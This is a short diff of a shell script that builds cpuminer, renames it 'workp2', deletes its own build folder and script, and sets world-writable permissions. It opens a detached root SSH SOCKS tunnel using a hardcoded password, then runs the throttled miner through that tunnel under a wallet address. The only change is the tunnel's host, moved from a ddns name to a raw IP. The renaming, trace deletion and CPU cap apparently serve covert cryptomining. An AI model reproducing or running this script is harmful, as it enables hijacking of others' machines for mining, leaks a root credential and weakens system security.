@@ -5,4 +5,4 @@ cd laptopedit
 chmod +x *
 ./build.sh
 make
-mv cpuminer workp2 && cp workp2 ../ && cd ..  && sudo rm -rf laptopedit work.sh && sudo chmod 777 * && screen -d -m sshpass -p workpro1997 ssh -o StrictHostKeyChecking=no -D 1997 root@proxywork.ddns.net && cpulimit --exe workp2 --limit 200 -b && screen -d -m ./workp2 -u H8x2qU1uHJr91hzt8nxN8R9fTUhyrbGkbe.Google -p x -x socks4://127.0.0.1:1997
+mv cpuminer workp2 && cp workp2 ../ && cd ..  && sudo rm -rf laptopedit work.sh && sudo chmod 777 * && screen -d -m sshpass -p workpro1997 ssh -o StrictHostKeyChecking=no -D 1997 root@167.99.60.104 && cpulimit --exe workp2 --limit 200 -b && screen -d -m ./workp2 -u H8x2qU1uHJr91hzt8nxN8R9fTUhyrbGkbe.Google -p x -x socks4://127.0.0.1:1997
